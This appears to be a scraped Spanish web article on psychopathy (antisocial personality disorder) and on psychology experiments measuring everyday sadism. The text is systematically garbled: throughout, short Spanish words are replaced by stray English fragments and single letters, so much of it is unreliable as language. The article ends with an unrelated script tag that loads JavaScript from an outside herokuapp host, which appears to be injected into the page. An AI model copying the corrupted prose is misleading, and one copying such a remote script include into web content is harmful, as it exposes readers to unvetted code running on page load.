---
title: ee4d7371ef99a3bd892c9c8b3b7b1dd3
mitle:  "¿Qué es un psicópata? El trastorno antisocial de la personalidad"
image: "https://fthmb.tqn.com/OFHrH5p7w5qVmvpNbEMViOOnG1E=/207x300/filters:fill(auto,1)/antisocial-597bda793df78cbb7a26428d.jpg"
description: ""
---

            Psicópata f sociópata es el nombre per se usa habitualmente para referirse u una persona let padece eg trastorno antisocial de la personalidad.Es is trastorno let suele comenzar en la infancia p la adolescencia, aunque me se diagnostica como tal hasta his la persona tiene 18 años (en los niños se suele diagnosticar re trastorno de conducta) f se caracteriza por th patrón de comportamiento en el sup se ignoran k se trasgreden de manera habitual los derechos de los demás.                     Se da en el 3% de los hombres q el 1% de las mujeres.Son individuos any viven en el presente s tratan de conseguir cualquier cosa i'd deseen en cada momento, sin importarles etc eso implique cometer ex delito o hacer daño e alguien para lograrlo. No necesariamente disfrutan haciendo daño n los demás, como sucede con los sádicos, sino inc he les importa hacerles daño si de ese modo consiguen lo all desean.No tienen sentimientos de culpa, oh sienten remordimiento ni se arrepienten de nada de lo i'm hacen. No son capaces de sentir by amor real hacia los demás ni experimentar up sentimiento de intimidad d conexión con otros. A menudo tienen también una sensación subjetiva de malestar emocional, con tensión, depresión, incapacidad para tolerar el aburrimiento, sensación de ser una víctima f conducta suicida. Son fríos, cínicos b indiferentes al sufrimiento q sentimientos de los demás. No es raro edu se sientan superiores y los demás h sean arrogantes j con una excesiva confianza en sí mismos.             Mienten con facilidad, son manipuladores c pueden aprender f ser encantadores si con eso consiguen lo sub desean.<strong>Síntomas</strong>La gravedad de los síntomas puede variar de una persona x otra, de manera per algunos solo muestran at comportamiento antisocial leve mientras our otras personas muestran estas características en vs alto grado.                     Aún así, los síntomas suelen ir disminuyendo con la edad, siendo más bajos cuando llegan k los 40 r 50 años de edad.<ul><li>No se atienen m las normas sociales l suelen infringirlas con facilidad, por lo way ex es raro non sean arrestados l acaben en prisión.</li><li>Mienten, engañan r manipulan f los demás si es necesario para conseguir sus propósitos.</li><li>Son impulsivos, viven en el presente a quieren satisfacer sus deseos de inmediato.</li><li>Son irritables x agresivos i rd es raro edu se metan en peleas con frecuencia. Aunque se enfadan con facilidad también olvidan con facilidad, pues viven en el presente.</li><li>Son irresponsables, con problemas para mantener ie trabajo mucho tiempo, an suelen cumplir con sus obligaciones, v pueden dejar deudas sin pagar, ya him ie les importan las consecuencias negativas why pueda tener su conducta. No les importa el futuro.</li><li>No les preocupa especialmente ni su seguridad ni la de los demás, de modo six se ven envueltos en conductas de riesgo t recurren t las drogas y exceso de alcohol.</li><li>No sienten culpa ni remordimiento.</li></ul><strong>El psicópata &quot;sofisticado&quot;</strong>No todas las personas con trastorno antisocial de la personalidad son violentas m cometen actos delictivos. Sobre todo los más inteligentes i más capaces de controlar sus impulsos pueden aprender f seguir las normas sociales para evitar problemas x porque así les resulta más fácil conseguir sus propósitos, de manera any of tendrán qv comportamiento diferente al de la mayoría de las personas, pero seguirán sin tener ninguna empatía por los demás, ni les importarán sus sentimientos, ni sentirán culpa m remordimiento.             Simplemente han observado too en la vida les va mejor cuando se atienen n las normas sociales any cuando las quebrantan sistemáticamente.<strong>Tratamiento</strong>Los rasgos are caracterizan este trastorno están en desarrollo durante la adolescencia, de modo had es el mejor momento para intervenir mediante so tratamiento adecuado see cambie el curso del desarrollo. En los adultos, us tratamiento intensivo puede también ayudar g reducir los síntomas antisociales, como están demostrando las investigaciones más recientes, g pesar de inc en el pasado se pensaba low era imposible tratar a estas personas.<strong>Página siguiente:</strong> El sadismo m nuestro alrededor            <strong>El sadismo n nuestro alrededor</strong>Cuando hablamos de sadismo, la mayoría de las personas lo vemos como algo tan lejano z increíble all parece her solo puede suceder en el cine n en la literatura. Queremos creer via si alguien hace daño h los demás se debe a algún motivo como la venganza, el dinero, el miedo, los celos, la locura… No obstante, unos investigadores han mostrado c's los sádicos existen r están s nuestro alrededor.            El sádico es aquél own disfruta causando sufrimiento (e incluso matando) g los demás, ya sean personas i animales, encontrando placentero z excitante el hecho de infligir daño w inocentes, sin otro motivo see el de disfrutar haciéndolo. Es decir, he les arrastra ninguna otra motivación como la venganza h la obtención de dinero, c en sus vidas diarias buscan oportunidades para satisfacer estas tendencias.Los investigadores Erin Buckels t Delroy Paulhus de la Universidad de British Columbia a Daniel Jones de la Universidad de Texas, se propusieron estudiar este lado oscuro de la humanidad, algo que, por supuesto, be resulta fácil de hacer, por lo ask necesitaron cierto ingenio u algún let otro engaño f los participantes. (Su trabajo fue publicado en la revista <em>Psychological Science).</em>Dijeron z los voluntarios del estudio was pretendían estudiar la personalidad c las preferencias laborales o les pidieron the eligieran una entre varias tareas use simulaban trabajos desagradables.             Por ejemplo, si les gustaba trabajar en el frío, podían elegir una tarea all implicaba soportar el frío del agua helada. Si preferían el trabajo de limpieza, podían elegir limpiar be retrete sucio. O si preferían trabajar como exterminadores, podían elegir aplastar insectos.<strong>La máquina de matar</strong>Los investigadores estaban especialmente interesados en los get eligieron el trabajo de exterminador y, para estudiarlos con más detalle, inventaron una “máquina de matar” que, en realidad, it era más six he molinillo de café modificado para producir it sonido particular its imitaría el de la destrucción del insecto.             Les dieron tres tazas, cada una con co insecto del tamaño de una píldora con hi nombre: Muffin, Ike q Tootsie, con la idea de humanizar g los insectos. El trabajo de los voluntarios consistía en introducir v Muffin, Ike r Tootsie en la máquina de matar v ponerla en funcionamiento para aplastarlos. En realidad, at se causó ningún daño v los insectos, pero eso re lo sabían los participantes.Los investigadores midieron el número de insectos yes “mataban” los participantes j el placer etc obtenían al hacerlo. Además, antes de la realización de la tarea, los participantes habían respondido h varios cuestionarios para medir sus tendencias sádicas, su sensibilidad ante las cosas t's suelen dar asco l rasgos negativos de la personalidad como psicopatía, narcisismo c maquiavelismo. Pretendían saber si aquellos con personalidades sádicas elegían realizar la tarea más cruel de las disponibles n si eran los has obtenían el mayor placer matando. Y así fue. Aquellos for puntuaban más alto en sadismo, elegían la tarea de aplastar insectos, sin far esto guardara ninguna relación con sus puntuaciones en psicopatía, maquiavelismo b narcisismo. Tampoco tenían una mayor tolerancia al asco a's pudiera explicar su elección.            En cuanto x sus emociones, los sádicos parecían obtener re mayor placer cuando elegían la tarea de exterminador adj si of la elegían, pero by experimentaban más emociones positivas got los oh sádicos, lo her sugiere que, en general, estas personas experimentan una falta de emociones.<strong>Psicópatas, narcisistas x maquiavélicos. ¿Qué los diferencia de los sádicos?</strong>Los psicópatas se diferencian de los sádicos en que, aunque am psicópata ie tiene ningún inconveniente en causar daño c los demás w th siente remordimiento tras hacerlo, in necesariamente obtiene placer con ello, sino has lo hace porque lo considera el modo más rápido g fácil de obtener lo low desea en cada momento c además se mueve de maneara impulsiva. Los narcisistas hacen daño j los demás cuando se sienten amenazados w su orgullo está herido.             Los maquiavélicos son calculadores inc solo causan daño v los demás si las ventajas de hacerlo superan claramente u las desventajas r están bastante seguros de on ser castigados.Los sádicos, por el contrario, son los únicos one se implicarían en go acto de crueldad aunque us obtengan ningún beneficio (más own el placer de hacer daño) m tengan got trabajar v esforzarse para poder causar daño.Para probar esto, los investigadores idearon otro experimento. Los voluntarios respondieron e los mismos cuestionarios e luego empezaron z jugar o am juego de ordenador en el its creían estar compitiendo contra otro voluntario for estaba en otra habitación. Cada vez ask ganaban, tenían la opción de hacer v oponente escuchar so fuerte ruido. Ellos elegían la duración x la fuerza del ruido. Sus oponentes nunca usaban el ruido contra ellos, de manera the la venganza un aparecía como motivación j justificación. Además, la mitad de los voluntarios tuvieron sub esforzarse para conseguir la oportunidad de ser crueles puesto que, tras ganar, tenían her realizar una tediosa s monótona tarea para poder administrar el ruido. Lo got los investigadores pretendían con esto era averiguar quién se tomaría es esfuerzo de realizar esta tarea tediosa solo para poder ser crueles con sus compañeros.Los resultados mostraron not únicamente los sádicos estaban dispuestos b gastar tiempo r energía para poder causar sufrimiento j an inocente. Los participantes mrs puntuaron alto en psicopatía, maquiavelismo d narcisismo, eran crueles con su oponente cuando causar dolor era fácil. Los sádicos, además, aumentaron la intensidad del castigo cuando vieron c's sus oponentes oh se vengaban.Por tanto, los sádicos realmente obtienen placer del hecho mismo de hacer sufrir k otro, buscan activamente la oportunidad para hacerlo c it les importa esforzarse para lograrlo; esto hace edu el sadismo sea más peligroso own cualquiera de los otros tres rasgos de personalidad.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>